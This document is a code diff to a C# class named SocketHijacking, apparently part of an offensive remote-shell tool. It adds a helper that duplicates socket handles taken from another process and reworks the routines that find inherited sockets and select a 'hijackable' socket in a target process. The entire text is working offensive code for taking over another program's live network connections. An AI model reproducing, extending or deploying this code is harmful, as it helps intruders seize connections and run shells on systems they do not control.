@@ -358,6 +358,21 @@ public static class SocketHijacking {
         return ret;
     }
 
+    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle) {
+        IntPtr retSocket = IntPtr.Zero;
+        IntPtr duplicatedSocket = IntPtr.Zero;
+        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
+        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
+        if (status == 0)
+        {
+            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
+            if (duplicatedSocket.ToInt64() > 0) {
+                retSocket = duplicatedSocket;
+            }
+        }
+        return retSocket;
+    }
+
     //helper method with "dynamic" buffer allocation
     public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
     {
@@ -486,16 +501,20 @@ public static class SocketHijacking {
             SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
             int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
             int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
-            if (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) != 0)
-                continue;
-            if (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) != 0)
-                continue;
-            if (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
+            IntPtr duplicatedParentSocket = DuplicateSocketFromHandle(parentSocketHandle);
+            if (duplicatedParentSocket == IntPtr.Zero) continue;
+            if (
+                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&
+                (getpeername(duplicatedParentSocket, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
+                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
+               )
             {
-                Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
+                Console.WriteLine("debug: found inherited socket! handle --> 0x" + duplicatedParentSocket.ToString("X4"));
                 inherited = true;
+                closesocket(duplicatedParentSocket);
                 break;
             }
+            closesocket(duplicatedParentSocket);
         }
         // cleaning all socket handles
         foreach (IntPtr dupHandle in parentSocketsHandles)
@@ -513,13 +532,8 @@ public static class SocketHijacking {
         {
             foreach (IntPtr socketHandle in targetProcessSockets) {
                 IntPtr dupSocketHandle = IntPtr.Zero;
-                WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
-                int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
-                if (status != 0)
-                    continue;
-                dupSocketHandle = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
-                if (dupSocketHandle == IntPtr.Zero || dupSocketHandle == new IntPtr(-1))
-                    continue;
+                dupSocketHandle = DuplicateSocketFromHandle(socketHandle);
+                if (dupSocketHandle == IntPtr.Zero) continue;
                 if (!IsSocketHijackable(dupSocketHandle)) {
                     closesocket(dupSocketHandle);
                     continue;
@@ -528,7 +542,6 @@ public static class SocketHijacking {
                 break;
             }
         }
-
         // cleaning all socket handles
         foreach (IntPtr dupHandle in targetProcessSockets)
             CloseHandle(dupHandle);
